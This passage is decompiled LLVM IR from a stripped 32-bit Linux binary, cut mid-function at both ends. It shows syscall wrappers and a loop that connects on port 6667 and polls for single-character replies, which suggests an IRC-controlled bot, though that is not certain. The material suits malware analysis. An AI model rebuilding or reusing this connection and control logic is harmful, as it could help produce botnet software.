  %v0_804aebe = load i32, i32* @global_var_80586e0.59, align 32
  store i32 %v0_804aebe, i32* %stack_var_-60, align 4
  %v1_804aec6 = call i32 @function_804d570(i32 %v0_804aebe)
  %v10_804aecb = icmp eq i32 %v1_804aec6, -1
  %v1_804aece = icmp eq i1 %v10_804aecb, false
  br i1 %v1_804aece, label %dec_label_pc_804af2a, label %dec_label_pc_804aed0

dec_label_pc_804aed0:                             ; preds = %dec_label_pc_804aebe, %dec_label_pc_804aead
  %v0_804aed0 = load i32, i32* @global_var_80586e0.59, align 32
  store i32 %v0_804aed0, i32* %stack_var_-60, align 4
  %v1_804aed8 = call i32 @function_804d598(i32 %v0_804aed0)
  %v4_804aee0 = icmp eq i32 %v1_804aed8, 0
  %v1_804aee4 = icmp eq i1 %v4_804aee0, false
  br i1 %v1_804aee4, label %dec_label_pc_804af02, label %dec_label_pc_804aee6

dec_label_pc_804aee6:                             ; preds = %dec_label_pc_804aed0
  store i32 0, i32* @global_var_80586e0.59, align 32
  %v0_804aef0 = load i32, i32* @global_var_80585c8.7, align 8
  store i32 %v0_804aef0, i32* %stack_var_-60, align 4
  %v1_804aef8 = call i32 @function_804b5f4(i32 %v0_804aef0)
  br label %dec_label_pc_804ae3c.backedge

dec_label_pc_804ae3c.backedge:                    ; preds = %dec_label_pc_804aee6, %dec_label_pc_804b085
  br label %dec_label_pc_804ae3c

dec_label_pc_804af02:                             ; preds = %dec_label_pc_804aed0
  %v1_804af05 = add i32 %v1_804aed8, 12
  %v2_804af05 = inttoptr i32 %v1_804af05 to i32*
  %v3_804af05 = load i32, i32* %v2_804af05, align 4
  %v1_804af13 = add i32 %v1_804aed8, 16
  %v2_804af13 = inttoptr i32 %v1_804af13 to i32*
  %v3_804af13 = load i32, i32* %v2_804af13, align 4
  %v1_804af16 = inttoptr i32 %v3_804af13 to i32*
  %v2_804af16 = load i32, i32* %v1_804af16, align 4
  store i32 %v2_804af16, i32* %stack_var_-60, align 4
  %v3_804af23 = call i32 @function_804d334(i32 %v2_804af16, i32 %v2_804af0d, i32 %v3_804af05)
  br label %dec_label_pc_804af3a

dec_label_pc_804af2a:                             ; preds = %dec_label_pc_804aebe
  %v0_804af2a = load i32, i32* @global_var_80586e0.59, align 32
  store i32 %v0_804af2a, i32* %stack_var_-60, align 4
  %v1_804af32 = call i32 @function_804d570(i32 %v0_804af2a)
  store i32 %v1_804af32, i32* %stack_var_-28, align 4
  br label %dec_label_pc_804af3a

dec_label_pc_804af3a:                             ; preds = %dec_label_pc_804af02, %dec_label_pc_804af2a
  store i32 2, i32* %stack_var_-32, align 4
  store i32 6667, i32* %stack_var_-60, align 4
  %v2_804af47 = call i32 @function_804d468(i16 6667)
  %v0_804af53 = load i32, i32* @global_var_80585c8.7, align 8
  store i32 %v0_804af53, i32* %stack_var_-60, align 4
  %v3_804af6b = call i32 @function_804b69c(i32 %v0_804af53, i32 21537, i32 %v2_804af59)
  store i32 0, i32* %stack_var_-60, align 4
  %v2_804af77 = call i32 @function_804b750(i32* null)
  store i32 0, i32* %stack_var_-60, align 4
  %v2_804b07416 = call i32 @function_804b750(i32* null)
  %v5_804b07917 = sub i32 %v2_804b07416, %v2_804af77
  %tmp = icmp ult i32 %v5_804b07917, 10
  br i1 %tmp, label %dec_label_pc_804af84, label %dec_label_pc_804b085

dec_label_pc_804af84:                             ; preds = %dec_label_pc_804af3a, %dec_label_pc_804b061
  %v1_804af84 = call i32 @function_804b7f4(i32 %v2_804af77)
  %v1_804af89 = inttoptr i32 %v1_804af84 to i32*
  store i32 0, i32* %v1_804af89, align 4
  %v0_804af92 = load i32, i32* @global_var_80585c8.7, align 8
  store i32 %v0_804af92, i32* %stack_var_-60, align 4
  %v3_804afa7 = call i32 @function_804d954(i32 %v0_804af92, i32 %v2_804af0a, i32 16)
  %v1_804afac = icmp eq i32 %v3_804afa7, 0
  br i1 %v1_804afac, label %dec_label_pc_804afc0, label %dec_label_pc_804afb0

dec_label_pc_804afb0:                             ; preds = %dec_label_pc_804af84
  %v0_804afb0 = load i32, i32* %stack_var_-60, align 4
  %v1_804afb0 = call i32 @function_804b7f4(i32 %v0_804afb0)
  %v1_804afb5 = inttoptr i32 %v1_804afb0 to i32*
  %v2_804afb5 = load i32, i32* %v1_804afb5, align 4
  %v9_804afb7 = icmp eq i32 %v2_804afb5, 106
  %v1_804afba = icmp eq i1 %v9_804afb7, false
  br i1 %v1_804afba, label %dec_label_pc_804b049, label %dec_label_pc_804afc0

dec_label_pc_804afc0:                             ; preds = %dec_label_pc_804afb0, %dec_label_pc_804af84
  %v0_804afc0 = load i32, i32* @global_var_80585c8.7, align 8
  store i32 %v0_804afc0, i32* %stack_var_-60, align 4
  %v5_804afe8 = call i32 @function_804da1c(i32 %v0_804afc0, i32 1, i32 13, i32 0, i32 0)
  %v0_804afed = load i32, i32* @global_var_80585c8.7, align 8
  store i32 %v0_804afed, i32* %stack_var_-60, align 4
  %v5_804b015 = call i32 @function_804da1c(i32 %v0_804afed, i32 1, i32 2, i32 0, i32 0)
  %v0_804b01a = load i32, i32* @global_var_80585c8.7, align 8
  store i32 %v0_804b01a, i32* %stack_var_-60, align 4
  %v5_804b042 = call i32 @function_804da1c(i32 %v0_804b01a, i32 1, i32 9, i32 0, i32 0)
  ret i32 %v5_804b042

dec_label_pc_804b049:                             ; preds = %dec_label_pc_804afb0
  %v0_804b049 = load i32, i32* %stack_var_-60, align 4
  %v1_804b049 = call i32 @function_804b7f4(i32 %v0_804b049)
  %v1_804b04e = inttoptr i32 %v1_804b049 to i32*
  %v2_804b04e = load i32, i32* %v1_804b04e, align 4
  %v9_804b050 = icmp eq i32 %v2_804b04e, 115
  br i1 %v9_804b050, label %dec_label_pc_804b061, label %dec_label_pc_804b055

dec_label_pc_804b055:                             ; preds = %dec_label_pc_804b049
  %v0_804b055 = load i32, i32* %stack_var_-60, align 4
  %v1_804b055 = call i32 @function_804b7f4(i32 %v0_804b055)
  %v1_804b05a = inttoptr i32 %v1_804b055 to i32*
  %v2_804b05a = load i32, i32* %v1_804b05a, align 4
  %v9_804b05c = icmp eq i32 %v2_804b05a, 114
  %v1_804b05f = icmp eq i1 %v9_804b05c, false
  br i1 %v1_804b05f, label %dec_label_pc_804b085, label %dec_label_pc_804b061

dec_label_pc_804b061:                             ; preds = %dec_label_pc_804b055, %dec_label_pc_804b049
  store i32 1, i32* %stack_var_-60, align 4
  %v1_804b068 = call i32 @function_804ed00(i32 1)
  store i32 0, i32* %stack_var_-60, align 4
  %v2_804b074 = call i32 @function_804b750(i32* null)
  %v5_804b079 = sub i32 %v2_804b074, %v2_804af77
  %tmp23 = icmp ult i32 %v5_804b079, 10
  br i1 %tmp23, label %dec_label_pc_804af84, label %dec_label_pc_804b085

dec_label_pc_804b085:                             ; preds = %dec_label_pc_804b061, %dec_label_pc_804b055, %dec_label_pc_804af3a
  store i32 0, i32* @global_var_80586e0.59, align 32
  %v0_804b08f = load i32, i32* @global_var_80585c8.7, align 8
  store i32 %v0_804b08f, i32* %stack_var_-60, align 4
  %v1_804b097 = call i32 @function_804b5f4(i32 %v0_804b08f)
  br label %dec_label_pc_804ae3c.backedge

; uselistorder directives
  uselistorder i32 %v2_804af77, { 2, 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 4, 5, 6, 3, 2, 7, 8, 9, 1, 10, 0, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_804da1c, { 2, 1, 0 }
  uselistorder i32 (i32*)* @function_804b750, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 (i32, i32, i32)* @function_804d334, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_804d598, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @function_804e754, { 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_804af84, { 1, 0 }
  uselistorder label %dec_label_pc_804af3a, { 1, 0 }
  uselistorder label %dec_label_pc_804ae3c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_804ae79, { 1, 0 }
}

define i32 @function_804b5f4(i32 %arg1) local_unnamed_addr {
dec_label_pc_804b5f4:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804b5f4 = load i32, i32* @edi, align 4
  store i32 %v0_804b5f4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804b5fc = load i32, i32* @ebx, align 4
  %v1_804b604 = call i32 @close(i32 %arg1)
  store i32 %v0_804b5fc, i32* @ebx, align 4
  store i32 %v1_804b604, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804b604, -4095
  br i1 %tmp, label %dec_label_pc_804b61c, label %dec_label_pc_804b610

dec_label_pc_804b610:                             ; preds = %dec_label_pc_804b5f4
  %v1_804b610 = call i32 @function_804b7f4(i32 %v0_804b5fc)
  %v0_804b615 = load i32, i32* %edi.global-to-local, align 4
  %v1_804b615 = sub i32 0, %v0_804b615
  %v2_804b617 = inttoptr i32 %v1_804b610 to i32*
  store i32 %v1_804b615, i32* %v2_804b617, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804b61c

dec_label_pc_804b61c:                             ; preds = %dec_label_pc_804b5f4, %dec_label_pc_804b610
  %v0_804b61d = phi i32 [ %v1_804b604, %dec_label_pc_804b5f4 ], [ -1, %dec_label_pc_804b610 ]
  %v2_804b620 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804b620, i32* @edi, align 4
  ret i32 %v0_804b61d

; uselistorder directives
  uselistorder i32 %v1_804b604, { 1, 0, 2 }
  uselistorder i32 %v0_804b5fc, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804b61c, { 1, 0 }
}

define i32 @function_804b624() local_unnamed_addr {
dec_label_pc_804b624:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804b624 = load i32, i32* @ebx, align 4
  store i32 %v0_804b624, i32* %stack_var_-4, align 4
  %v1_804b62d = call i32 @fork(i32 %v0_804b624)
  store i32 %v1_804b62d, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804b62d, -4095
  br i1 %tmp, label %dec_label_pc_804b644, label %dec_label_pc_804b638

dec_label_pc_804b638:                             ; preds = %dec_label_pc_804b624
  %v0_804b638 = load i32, i32* %stack_var_-4, align 4
  %v1_804b638 = call i32 @function_804b7f4(i32 %v0_804b638)
  %v0_804b63d = load i32, i32* %ebx.global-to-local, align 4
  %v1_804b63d = sub i32 0, %v0_804b63d
  %v2_804b63f = inttoptr i32 %v1_804b638 to i32*
  store i32 %v1_804b63d, i32* %v2_804b63f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804b644

dec_label_pc_804b644:                             ; preds = %dec_label_pc_804b624, %dec_label_pc_804b638
  %v0_804b645 = phi i32 [ %v1_804b62d, %dec_label_pc_804b624 ], [ -1, %dec_label_pc_804b638 ]
  %v2_804b648 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804b648, i32* @ebx, align 4
  ret i32 %v0_804b645

; uselistorder directives
  uselistorder i32 %v1_804b62d, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804b644, { 1, 0 }
}

define i32 @function_804b64c() local_unnamed_addr {
dec_label_pc_804b64c:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804b64c = load i32, i32* @ebx, align 4
  store i32 %v0_804b64c, i32* %stack_var_-4, align 4
  %v1_804b655 = call i32 @getpid(i32 %v0_804b64c)
  store i32 %v1_804b655, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804b655, -4095
  br i1 %tmp, label %dec_label_pc_804b66c, label %dec_label_pc_804b660

dec_label_pc_804b660:                             ; preds = %dec_label_pc_804b64c
  %v0_804b660 = load i32, i32* %stack_var_-4, align 4
  %v1_804b660 = call i32 @function_804b7f4(i32 %v0_804b660)
  %v0_804b665 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804b665 = sub i32 0, %v0_804b665
  %v2_804b667 = inttoptr i32 %v1_804b660 to i32*
  store i32 %v1_804b665, i32* %v2_804b667, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804b66c

dec_label_pc_804b66c:                             ; preds = %dec_label_pc_804b64c, %dec_label_pc_804b660
  %v0_804b66d = phi i32 [ %v1_804b655, %dec_label_pc_804b64c ], [ -1, %dec_label_pc_804b660 ]
  %v2_804b670 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804b670, i32* @ebx, align 4
  ret i32 %v0_804b66d

; uselistorder directives
  uselistorder i32 %v1_804b655, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804b66c, { 1, 0 }
}

define i32 @function_804b69c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804b69c:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804b69c = load i32, i32* @edi, align 4
  store i32 %v0_804b69c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg3, i32* @edx, align 4
  %v0_804b6b4 = load i32, i32* @ebx, align 4
  %v2_804b6bc = call i32 (i32, i32, ...) @ioctl(i32 %arg1, i32 %arg2)
  store i32 %v0_804b6b4, i32* @ebx, align 4
  store i32 %v2_804b6bc, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v2_804b6bc, -4095
  br i1 %tmp, label %dec_label_pc_804b6d4, label %dec_label_pc_804b6c8

dec_label_pc_804b6c8:                             ; preds = %dec_label_pc_804b69c
  %v1_804b6c8 = call i32 @function_804b7f4(i32 %v0_804b6b4)
  %v0_804b6cd = load i32, i32* %edi.global-to-local, align 4
  %v1_804b6cd = sub i32 0, %v0_804b6cd
  %v2_804b6cf = inttoptr i32 %v1_804b6c8 to i32*
  store i32 %v1_804b6cd, i32* %v2_804b6cf, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804b6d4

dec_label_pc_804b6d4:                             ; preds = %dec_label_pc_804b69c, %dec_label_pc_804b6c8
  %v0_804b6d7 = phi i32 [ %v2_804b6bc, %dec_label_pc_804b69c ], [ -1, %dec_label_pc_804b6c8 ]
  %v2_804b6d9 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804b6d9, i32* @edi, align 4
  ret i32 %v0_804b6d7

; uselistorder directives
  uselistorder i32 %v2_804b6bc, { 1, 0, 2 }
  uselistorder i32 %v0_804b6b4, { 1, 0 }
  uselistorder label %dec_label_pc_804b6d4, { 1, 0 }
}

define i32 @function_804b6dc(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_804b6dc:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804b6dc = load i32, i32* @ebx, align 4
  store i32 %v0_804b6dc, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804b6ef = call i32 @kill(i32 %arg1, i32 %arg2)
  store i32 %v2_804b6ef, i32* %ebx.global-to-local, align 4
  %tmp = icmp ult i32 %v2_804b6ef, -4095
  br i1 %tmp, label %dec_label_pc_804b708, label %dec_label_pc_804b6fc

dec_label_pc_804b6fc:                             ; preds = %dec_label_pc_804b6dc
  %v0_804b6fc = load i32, i32* %stack_var_-4, align 4
  %v1_804b6fc = call i32 @function_804b7f4(i32 %v0_804b6fc)
  %v0_804b701 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804b701 = sub i32 0, %v0_804b701
  %v2_804b703 = inttoptr i32 %v1_804b6fc to i32*
  store i32 %v1_804b701, i32* %v2_804b703, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804b708

dec_label_pc_804b708:                             ; preds = %dec_label_pc_804b6dc, %dec_label_pc_804b6fc
  %v0_804b709 = phi i32 [ %v2_804b6ef, %dec_label_pc_804b6dc ], [ -1, %dec_label_pc_804b6fc ]
  %v2_804b708 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804b708, i32* @edx, align 4
  %v2_804b70c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804b70c, i32* @ebx, align 4
  ret i32 %v0_804b709

; uselistorder directives
  uselistorder i32 %v2_804b6ef, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804b708, { 1, 0 }
}

define i32 @function_804b710(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_804b710:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_804b711 = load i32, i32* @esi, align 4
  store i32 %v0_804b711, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_804b729 = load i32, i32* @ebx, align 4
  %v1_804b731 = call i32 @int80_syscall(i32 142)
  store i32 %v0_804b729, i32* @ebx, align 4
  store i32 %v1_804b731, i32* %esi.global-to-local, align 4
  %tmp = icmp ult i32 %v1_804b731, -4095
  br i1 %tmp, label %dec_label_pc_804b749, label %dec_label_pc_804b73d

dec_label_pc_804b73d:                             ; preds = %dec_label_pc_804b710
  %v1_804b73d = call i32 @function_804b7f4(i32 %v0_804b729)
  %v0_804b742 = load i32, i32* %esi.global-to-local, align 4
  %v1_804b742 = sub i32 0, %v0_804b742
  %v2_804b744 = inttoptr i32 %v1_804b73d to i32*
  store i32 %v1_804b742, i32* %v2_804b744, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804b749

dec_label_pc_804b749:                             ; preds = %dec_label_pc_804b710, %dec_label_pc_804b73d
  %v0_804b74a = phi i32 [ %v1_804b731, %dec_label_pc_804b710 ], [ -1, %dec_label_pc_804b73d ]
  %v2_804b74c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_804b74c, i32* @esi, align 4
  ret i32 %v0_804b74a

; uselistorder directives
  uselistorder i32 %v1_804b731, { 1, 0, 2 }
  uselistorder i32 %v0_804b729, { 1, 0 }
  uselistorder label %dec_label_pc_804b749, { 1, 0 }
}

define i32 @function_804b750(i32* %arg1) local_unnamed_addr {
dec_label_pc_804b750:
  %edi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_804b750 = load i32, i32* @edi, align 4
  store i32 %v0_804b750, i32* %stack_var_-4, align 4
  store i32 %tmp3, i32* %edi.global-to-local, align 4
  %v0_804b758 = load i32, i32* @ebx, align 4
  %v2_804b760 = call i32 @time(i32* %arg1)
  store i32 %v0_804b758, i32* @ebx, align 4
  store i32 %v2_804b760, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v2_804b760, -4095
  br i1 %tmp, label %dec_label_pc_804b778, label %dec_label_pc_804b76c

dec_label_pc_804b76c:                             ; preds = %dec_label_pc_804b750
  %v1_804b76c = call i32 @function_804b7f4(i32 %v0_804b758)
  %v0_804b771 = load i32, i32* %edi.global-to-local, align 4
  %v1_804b771 = sub i32 0, %v0_804b771
  %v2_804b773 = inttoptr i32 %v1_804b76c to i32*
  store i32 %v1_804b771, i32* %v2_804b773, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804b778

dec_label_pc_804b778:                             ; preds = %dec_label_pc_804b750, %dec_label_pc_804b76c
  %v0_804b779 = phi i32 [ %v2_804b760, %dec_label_pc_804b750 ], [ -1, %dec_label_pc_804b76c ]
  %v2_804b77c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804b77c, i32* @edi, align 4
  ret i32 %v0_804b779

; uselistorder directives
  uselistorder i32 %v2_804b760, { 1, 0, 2 }
  uselistorder i32 %v0_804b758, { 1, 0 }
  uselistorder label %dec_label_pc_804b778, { 1, 0 }
}

define i32 @function_804b780(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804b780:
  %v5_804b791 = call i32 @function_804f7ec(i32 %arg1, i32 %arg2, i32 %arg3, %rusage* null)
  ret i32 %v5_804b791
}

define i32 @function_804b79c(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_804b79c:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804b79c = load i32, i32* @edi, align 4
  store i32 %v0_804b79c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804b7ac = load i32, i32* @ebx, align 4
  %v4_804b7b4 = call i32 @write(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_804b7ac, i32* @ebx, align 4
  store i32 %v4_804b7b4, i32* %edi.global-to-local, align 4
  %tmp = icmp ult i32 %v4_804b7b4, -4095
  br i1 %tmp, label %dec_label_pc_804b7cc, label %dec_label_pc_804b7c0

dec_label_pc_804b7c0:                             ; preds = %dec_label_pc_804b79c
  %v1_804b7c0 = call i32 @function_804b7f4(i32 %v0_804b7ac)
  %v0_804b7c5 = load i32, i32* %edi.global-to-local, align 4
  %v1_804b7c5 = sub i32 0, %v0_804b7c5
  %v2_804b7c7 = inttoptr i32 %v1_804b7c0 to i32*
  store i32 %v1_804b7c5, i32* %v2_804b7c7, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804b7cc

dec_label_pc_804b7cc:                             ; preds = %dec_label_pc_804b79c, %dec_label_pc_804b7c0
  %v0_804b7cd = phi i32 [ %v4_804b7b4, %dec_label_pc_804b79c ], [ -1, %dec_label_pc_804b7c0 ]
  %v2_804b7cc = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804b7cc, i32* @edx, align 4
  %v2_804b7d0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804b7d0, i32* @edi, align 4
  ret i32 %v0_804b7cd

; uselistorder directives
  uselistorder i32 %v4_804b7b4, { 1, 0, 2 }
  uselistorder i32 %v0_804b7ac, { 1, 0 }
  uselistorder label %dec_label_pc_804b7cc, { 1, 0 }
}

define i32 @function_804b7d4(i32 %arg1) local_unnamed_addr {
dec_label_pc_804b7d4:
  %v1_804b7d8 = add i32 %arg1, 128
  %v6_804b7e3 = icmp ugt i32 %v1_804b7d8, 383
  br i1 %v6_804b7e3, label %dec_label_pc_804b7ee, label %dec_label_pc_804b7e5

dec_label_pc_804b7e5:                             ; preds = %dec_label_pc_804b7d4
  %v0_804b7e5 = load i32, i32* inttoptr (i32 134568772 to i32*), align 4
  %v2_804b7ea = mul i32 %arg1, 2
  %v3_804b7ea = add i32 %v0_804b7e5, %v2_804b7ea
  %v4_804b7ea = inttoptr i32 %v3_804b7ea to i16*
  %v5_804b7ea = load i16, i16* %v4_804b7ea, align 2
  %v6_804b7ea = sext i16 %v5_804b7ea to i32
  br label %dec_label_pc_804b7ee

dec_label_pc_804b7ee:                             ; preds = %dec_label_pc_804b7d4, %dec_label_pc_804b7e5
  %v0_804b7ee = phi i32 [ %arg1, %dec_label_pc_804b7d4 ], [ %v6_804b7ea, %dec_label_pc_804b7e5 ]
  ret i32 %v0_804b7ee

; uselistorder directives
  uselistorder label %dec_label_pc_804b7ee, { 1, 0 }
}

define i32 @function_804b7f4(i32 %arg1) local_unnamed_addr {
dec_label_pc_804b7f4:
  ret i32 ptrtoint (i32* @global_var_8058480.106 to i32)
}

define i32 @function_804b7fc(i16* %arg1) local_unnamed_addr {
dec_label_pc_804b7fc:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_804b7fc = load i32, i32* @ebp, align 4
  %v0_804b7fd = load i32, i32* @edi, align 4
  %v0_804b7fe = load i32, i32* @esi, align 4
  %v0_804b7ff = load i32, i32* @ebx, align 4
  %v4_804b803 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804b803, i32* @esi, align 4
  %v1_804b807 = add i32 %v4_804b803, 52
  %v2_804b807 = inttoptr i32 %v1_804b807 to i32*
  %v3_804b807 = load i32, i32* %v2_804b807, align 4
  store i32 %v3_804b807, i32* @ebp, align 4
  %v1_804b80a = icmp eq i32 %v3_804b807, 0
  %v1_804b80c = icmp eq i1 %v1_804b80a, false
  br i1 %v1_804b80c, label %dec_label_pc_804b82d, label %dec_label_pc_804b80e

dec_label_pc_804b80e:                             ; preds = %dec_label_pc_804b7fc
  %v1_804b80e = add i32 %v4_804b803, 56
  store i32 %v1_804b80e, i32* @ebx, align 4
  %v2_804b818 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804b818, i32* @eax, align 4
  %v2_804b81d = call i32 @function_804f016(i32 %v2_804b818, i32 134541331)
  %v0_804b822 = load i32, i32* @ebx, align 4
  %v1_804b825 = call i32 @function_804f013(i32 %v0_804b822)
  store i32 %v1_804b825, i32* @eax, align 4
  %v0_804b82f.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804b82d

dec_label_pc_804b82d:                             ; preds = %dec_label_pc_804b7fc, %dec_label_pc_804b80e
  %v0_804b837 = phi i32 [ %v4_804b803, %dec_label_pc_804b7fc ], [ %v0_804b82f.pre, %dec_label_pc_804b80e ]
  store i32 0, i32* @edi, align 4
  %v1_804b82f = inttoptr i32 %v0_804b837 to i8*
  %v2_804b82f = load i8, i8* %v1_804b82f, align 1
  %v3_804b82f = and i8 %v2_804b82f, 64
  %v4_804b82f = icmp eq i8 %v3_804b82f, 0
  br i1 %v4_804b82f, label %dec_label_pc_804b82d.dec_label_pc_804b842_crit_edge, label %dec_label_pc_804b834

dec_label_pc_804b82d.dec_label_pc_804b842_crit_edge: ; preds = %dec_label_pc_804b82d
  br label %dec_label_pc_804b842

dec_label_pc_804b834:                             ; preds = %dec_label_pc_804b82d
  %v1_804b838 = inttoptr i32 %v0_804b837 to i16*
  %v2_804b838 = call i32 @function_804ce84(i16* %v1_804b838)
  store i32 %v2_804b838, i32* @edi, align 4
  %v0_804b845.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_804b842

dec_label_pc_804b842:                             ; preds = %dec_label_pc_804b82d.dec_label_pc_804b842_crit_edge, %dec_label_pc_804b834
  %v0_804b845 = phi i32 [ %v0_804b837, %dec_label_pc_804b82d.dec_label_pc_804b842_crit_edge ], [ %v0_804b845.pre, %dec_label_pc_804b834 ]
  %v1_804b845 = add i32 %v0_804b845, 4
  %v2_804b845 = inttoptr i32 %v1_804b845 to i32*
  %v3_804b845 = load i32, i32* %v2_804b845, align 4
  %v1_804b848 = call i32 @function_804b5f4(i32 %v3_804b845)
  %v0_804b850 = load i32, i32* @esi, align 4
  %v1_804b850 = add i32 %v0_804b850, 4
  %v2_804b850 = inttoptr i32 %v1_804b850 to i32*
  store i32 -1, i32* %v2_804b850, align 4
  %v2_804b861 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_804b861, i32* @ebx, align 4
  %v2_804b866 = icmp slt i32 %v1_804b848, 0
  store i32 -1, i32* @eax, align 4
  %v1_804b86d = load i32, i32* @edi, align 4
  %v3_804b86d = select i1 %v2_804b866, i32 -1, i32 %v1_804b86d
  store i32 %v3_804b86d, i32* @edi, align 4
  %v2_804b870 = call i32 @function_804f016(i32 %v2_804b861, i32 134541331)
  %v1_804b87c = call i32 @function_804f013(i32 ptrtoint (i32* @global_var_8055b78.107 to i32))
  %v0_804b881 = load i32, i32* @global_var_8056240.108, align 64
  %v1_804b886 = add i32 %v0_804b881, 1
  store i32 %v1_804b886, i32* @global_var_8056240.108, align 64
  store i32 ptrtoint (i32* @global_var_8055b78.107 to i32), i32* @eax, align 4
  %v2_804b891 = call i32 @function_804f016(i32 %v2_804b861, i32 1)
  %v0_804b896 = load i32, i32* @esi, align 4
  %v1_804b896 = inttoptr i32 %v0_804b896 to i32*
  %v2_804b896 = load i32, i32* %v1_804b896, align 4
  %v1_804b89b = and i32 %v2_804b896, 24576
  %v1_804b8a0 = or i32 %v1_804b89b, 48
  store i32 %v1_804b8a0, i32* @eax, align 4
  %v1_804b8a5 = trunc i32 %v1_804b8a0 to i16
  %v3_804b8a5 = inttoptr i32 %v0_804b896 to i16*
  store i16 %v1_804b8a5, i16* %v3_804b8a5, align 2
  br i1 %v1_804b80c, label %dec_label_pc_804b8bb, label %dec_label_pc_804b8aa

dec_label_pc_804b8aa:                             ; preds = %dec_label_pc_804b842
  %v2_804b8ae = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_804b8ae, i32* @eax, align 4
  %v2_804b8b3 = call i32 @function_804f016(i32 %v2_804b8ae, i32 1)
  store i32 %v2_804b8b3, i32* @eax, align 4
  br label %dec_label_pc_804b8bb

dec_label_pc_804b8bb:                             ; preds = %dec_label_pc_804b842, %dec_label_pc_804b8aa
  %v0_804b8bb = load i32, i32* @esi, align 4
  %v1_804b8bb = add i32 %v0_804b8bb, 1
  %v2_804b8bb = inttoptr i32 %v1_804b8bb to i8*
  %v3_804b8bb = load i8, i8* %v2_804b8bb, align 1
  %v4_804b8bb = and i8 %v3_804b8bb, 64
  %v5_804b8bb = icmp eq i8 %v4_804b8bb, 0
